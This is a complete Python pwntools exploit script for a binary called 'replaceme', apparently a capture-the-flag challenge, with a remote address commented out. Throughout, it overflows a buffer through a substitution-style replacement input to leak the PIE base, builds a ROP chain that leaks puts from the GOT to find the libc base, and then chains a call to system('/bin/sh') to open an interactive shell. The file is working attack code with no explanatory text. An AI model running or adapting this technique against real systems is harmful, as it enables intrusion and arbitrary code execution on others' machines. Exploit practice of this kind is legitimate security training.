#!/usr/bin/env python3
from pwn import *
import warnings

warnings.filterwarnings('ignore')
context.log_level = 'CRITICAL'
context.binary = binary = ELF('./replaceme',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

payload1 = b'a'*0x70+b'c'*0x8
replace1 = b's/'+b'c'*0x8+b'/'+b'a'*0x58+p16(binary.symbols.main)+b'/'

data = b''
while b'Input: ' not in data:
	p = process()
	#p = remote('94.237.55.96',54545)
	p.sendlineafter(b'Input: ', payload1)
	p.sendlineafter(b'Replacement: ', replace1)
	try:
		data = p.recvrepeat(1)
	except:
		continue

main = u64(data[245:data.index(b'Welcome')].ljust(8, b'\x00'))
binary.address = main - binary.symbols.main
print(f'main: {hex(main)}')
print(f'pie base: {hex(binary.address)}')

r = ROP(binary)
POP_RDI = r.find_gadget(['pop rdi','ret'])[0]
RET = r.find_gadget(['ret'])[0]

rop1 = p64(POP_RDI)
rop1 += p64(binary.got.puts)
rop1 += p64(binary.plt.puts)
rop1 += p64(binary.symbols.main)

payload2 = b'a'*0x7e+b'c'
replace2 = b's/'+b'c'+b'/'+b'a'*0x4a+rop1+b'/'

p.sendline(payload2)
p.sendline(replace2)

p.recvuntil(p64(POP_RDI)[:6])
puts_libc = u64(p.recvline()[:-1].ljust(8, b'\x00'))
libc.address = puts_libc - libc.symbols.puts
print(f'libc leak: {hex(puts_libc)}')
print(f'libc base: {hex(libc.address)}')

rop2 = p64(POP_RDI)
rop2 += p64(next(libc.search(b'/bin/sh\x00')))
rop2 += p64(libc.symbols.system)

payload2 = b'a'*0x7e+b'c'
replace2 = b's/'+b'c'+b'/'+b'a'*0x4a+rop2+b'/'

p.sendline(payload2)
p.sendline(replace2)

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
